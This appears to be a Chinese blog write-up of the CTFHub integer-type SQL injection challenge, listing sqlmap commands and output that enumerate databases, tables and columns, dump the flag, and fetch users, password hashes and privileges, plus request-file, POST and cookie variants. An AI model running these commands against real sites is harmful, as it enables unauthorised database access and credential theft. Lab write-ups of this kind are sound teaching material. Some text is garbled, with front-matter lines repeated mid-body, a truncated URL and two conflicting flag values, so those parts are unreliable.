---
title: 整数型SQL注入
description: ctfhub整数型SQL注入
tags:
- ctf
- SQL
category: web渗透
draft: false
published: 2024-11-12
---

ctfhub{f797878b77751f2aa52c00bd}

#### 检测注入点

```cobol
sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1"             //检测过程中需要手动输入y/n，即是否继续进行[sql注入](sql注入.md)检测
sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1" --batch     //检测过程中默认继续进行[sql注入](sql注入.md)检测
```

#### 产看所有数据库

```sql
sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:--dbs
```

```shell
available databases [4]:                               
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli
```

#### 查看当前网站使用的数据库

```sql
sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1" --current-db
```

#### 产看[数据表](https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E8%A1%A8&spm=1001.2101.3001.7020)

```sql
sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1" -D 'sqli' --tables
```

```shell
Database: sqli                                         
[2 tables]
+------+
| flag |
| news |
+------+
```

#### 查看字段

```sql
sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1" -D 'sqli' -T 'flag' --columns
```

```shell
Database: sqli
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(100) |
+--------+--------------+
```

#### 查看字段数据

```perl
sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1" -D 'sqli' -T 'flag' --dump
```

```shell
abase 'sqli'
Database: sqli'
Table: flag
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{4598642ab583bc461923d8c9} |
+----------------------------------+
```

#### [查看数据库](https://so.csdn.net/so/search?q=%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020)用户

```sql
sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1" --current-user
```

#### 查看所有用户

```sql
sqlmap -u 完整url --users
```

#### 获取数据库用户密码

```sql
sqlmap -u 完整url --passwords
```

#### 查看[用户权限](https://so.csdn.net/so/search?q=%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020)

```sql
sqlmap -u 完整url --privileges
```

#### 判断当前数据库用户是否是管理员

```csharp
sqlmap -u 完整url --is-dba
```

### 自动化扫描

将抓到的数据包右键copy to file，然后使用kali注入

```sql
sqlmap -r '数据包路径' --dbs --batch
```

### 批量自动化扫描

新建xxx.txt文件，里面存放多个url

```undefined
sqlmap -m xxx.txt
```

---

### post请求注入

将抓包抓到的http请求内容存放到.txt文件中

```undefined
sqlmap -r xxx.txt
```

tags: [web渗透]
title: 整数型SQL注入
title: 整数型SQL注入
title: 整数型SQL注入
tags: [web渗透]
title: 整数型SQL注入

tags: [web渗透]
---

### cookie注入

一些需要登录的网站在用sqlmap进行注入时，需要添加cookie参数：

```csharp
sqlmap -u 完整curl --cookie 'cookie'（单引号和双引号都行）
```



